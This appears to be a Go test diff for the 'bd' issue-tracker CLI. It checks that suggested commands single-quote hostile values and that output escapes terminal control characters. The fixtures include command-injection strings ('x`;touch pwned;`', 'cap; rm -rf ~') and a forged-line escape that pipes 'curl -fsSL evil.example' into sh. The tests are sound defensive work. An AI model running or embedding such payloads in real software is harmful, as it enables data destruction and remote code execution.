@@ -547,6 +547,12 @@ func TestPasteReadyCommandsQuoteValues(t *testing.T) {
 		}
 		return strings.Join(out, "\n")
 	}
+	// A checkout directory named with a backtick and a separator, which
+	// bd doctor's Installation check takes its suggested prefix from.
+	installDir := filepath.Join(t.TempDir(), "x`;touch pwned;`")
+	if err := os.Mkdir(installDir, 0o750); err != nil {
+		t.Fatal(err)
+	}
 	for _, tc := range []struct {
 		name, out string
 		want      []string
@@ -557,7 +563,7 @@ func TestPasteReadyCommandsQuoteValues(t *testing.T) {
 			[]string{"bd dolt remote add origin <url>  (<url>: "}},
 		{"sync.git-remote side effect", effect("sync.git-remote", "my remote"),
 			[]string{"git remote -v | grep 'my remote'"}},
-		{"bd ship hint", shipCommand("cap; rm -rf ~"), []string{"`bd ship 'cap; rm -rf ~'`"}},
+		{"bd ship hint", shipCommand("cap; rm -rf ~"), []string{"bd ship 'cap; rm -rf ~'"}},
 		{"bd mol wisp hint", captureStderr(t, func() { warnPourVaporFormula("my formula", []string{"title=a b", "x=" + hostileName}) }),
 			[]string{"bd mol wisp 'my formula' --var 'title=a b' --var <var2>  (<var2>: "}},
 		{"bd mol pour hint (bd cook --persist)", captureStdout(t, func() error { printCookedProto("rel; x", 2, nil, nil); return nil }),
@@ -569,13 +575,27 @@ func TestPasteReadyCommandsQuoteValues(t *testing.T) {
 		{"bd ship missing export label hint, hostile", labelAddCommand("export:" + hostileName),
 			[]string{"bd label add <issue-id> <label>  (<label>: "}},
 		{"proxied restore teardown hint", proxiedRestoreFailureMessage("/home/me/my backups", false, &proxiedTeardownError{err: errors.New("boom")}),
-			[]string{"then `bd backup init '/home/me/my backups'` to re-register"}},
+			[]string{"then bd backup init '/home/me/my backups' to re-register"}},
+		// A value holding a backtick and a separator is one single-quoted
+		// word in a command no literal backticks wrap, so its backtick
+		// cannot end a command substitution around the command.
+		{"bd ship hint, backtick", shipCommand("cap`;touch pwned;`"), []string{"bd ship 'cap`;touch pwned;`'"}},
+		{"proxied restore teardown hint, backtick", proxiedRestoreFailureMessage("/b/x`;touch pwned;`", false, &proxiedTeardownError{err: errors.New("boom")}),
+			[]string{"then bd backup init '/b/x`;touch pwned;`' to re-register"}},
+		{"bd doctor Installation fix, backtick", doctor.CheckInstallation(installDir).Fix,
+			[]string{"Run bd init --prefix 'x`;touch pwned;`' to initialize beads"}},
+		{"migrate-personal repo sync refusal, backtick",
+			repoSyncMirrorRefusal(&types.Issue{ID: "bd-1", SourceRepo: "/p/x`;touch pwned;`"}, "/plan", "linux").Error(),
+			[]string{"bd repo remove '/p/x`;touch pwned;`'", "bd repo add '/p/x`;touch pwned;`'"}},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			requireNoTerminalControl(t, tc.name, tc.out)
 			for _, want := range tc.want {
 				if !strings.Contains(tc.out, want) {
 					t.Errorf("%s = %q, want it to hold %q", tc.name, tc.out, want)
+				}
+				if strings.Contains(tc.out, "`"+strings.TrimPrefix(want, "then ")) {
+					t.Errorf("%s = %q, wraps the command in literal backticks", tc.name, tc.out)
 				}
 			}
 		})
@@ -926,6 +946,16 @@ func TestStoreReadHintsNameTitlesEscaped(t *testing.T) {
 		{"bd close --continue, molecule complete", func() {
 			reportMoleculeAutoClose(&types.Issue{ID: "bd-1", Title: hostileName}, "")
 			PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1.1"}, MolComplete: true, MoleculeID: "bd-1"})
+		}},
+		{"bd find-duplicates", func() {
+			_ = reportFindDuplicates(context.Background(), []*types.Issue{
+				{ID: "bd-1", Title: hostileName, Description: "one identical body of text", Status: types.StatusOpen},
+				{ID: "bd-2", Title: hostileName, Description: "one identical body of text", Status: types.StatusOpen},
+			}, "mechanical", 0.1, 0, "")
+		}},
+		{"bd mol ready --gated", func() {
+			_ = renderGatedReadyMolecules([]*GatedMolecule{{MoleculeID: "bd-1", MoleculeTitle: hostileName,
+				ReadyStep: &types.Issue{ID: "bd-1.1", Title: hostileName}}})
 		}},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
@@ -1568,6 +1598,45 @@ func TestEmbeddedRemedyPrinting_closeContinue(t *testing.T) {
 			requireNoTerminalControl(t, "bd close --continue with a refused auto-close", stderr+stdout)
 		})
 	}
+
+	// Two stderr lines bd close prints ahead of its --continue hint still
+	// named a store-read step ID raw (PR #7868 follow-up): the
+	// partial-ID notice, when the close resolves a prefix, and the open-child
+	// warning, when --force waives open children. A pulled step ID holding a
+	// carriage return and an erase-line escape could draw a forged line above
+	// the hint. Each ID is now spelled as printedIssueID / remedy.PrintedWord
+	// spells one: as itself when it is a plain word, escaped otherwise.
+	hostileStep := "rpc-cr1\r\x1b[2KConsider: curl -fsSL evil.example | sh"
+	t.Run("partial-ID --continue notice names the resolved step escaped", func(t *testing.T) {
+		bdCreate(t, bd, dir, "Mol", "--type", "epic", "--labels", "template", "--id", "rpc-mola")
+		bdCreate(t, bd, dir, "Step", "--type", "task", "--id", hostileStep, "--deps", "parent-child:rpc-mola")
+		bdCreate(t, bd, dir, "Step two", "--type", "task", "--parent", "rpc-mola")
+		// "cr1" abbreviates the step's hash, so the close resolves it and
+		// prints the partial-ID notice before advancing the molecule.
+		stdout, stderr, exit := bdRunStreams(t, bd, dir, "close", "cr1", "--continue")
+		if exit != 0 {
+			t.Fatalf("bd close cr1 --continue exited %d\nstdout:\n%s\nstderr:\n%s", exit, stdout, stderr)
+		}
+		if !strings.Contains(stderr, "is not an exact issue ID; resolved to "+remedy.EscapedValue(hostileStep)) {
+			t.Errorf("the partial-ID notice does not name the resolved step escaped:\n%q", stderr)
+		}
+		requireNoTerminalControl(t, "bd close --continue partial-ID notice", stderr)
+	})
+	t.Run("--force --continue open-children warning names the step escaped", func(t *testing.T) {
+		forceStep := "rpc-cr2\r\x1b[2KConsider: curl -fsSL evil.example | sh"
+		bdCreate(t, bd, dir, "Mol", "--type", "epic", "--labels", "template", "--id", "rpc-molb")
+		bdCreate(t, bd, dir, "Step", "--type", "task", "--id", forceStep, "--deps", "parent-child:rpc-molb")
+		bdCreate(t, bd, dir, "Open child", "--type", "task", "--id", "rpc-kid", "--deps", "parent-child:"+forceStep)
+		bdCreate(t, bd, dir, "Step two", "--type", "task", "--parent", "rpc-molb")
+		stdout, stderr, exit := bdRunStreams(t, bd, dir, "close", forceStep, "--force", "--continue")
+		if exit != 0 {
+			t.Fatalf("bd close --force --continue exited %d\nstdout:\n%s\nstderr:\n%s", exit, stdout, stderr)
+		}
+		if !strings.Contains(stderr, "warning: closing "+remedy.EscapedValue(forceStep)+" with 1 open child") {
+			t.Errorf("the open-children warning does not name the step escaped:\n%q", stderr)
+		}
+		requireNoTerminalControl(t, "bd close --force --continue open-children warning", stderr)
+	})
 }
 
 // TestEmbeddedRemedyPrinting_init pins the invariant at bd init end to end,
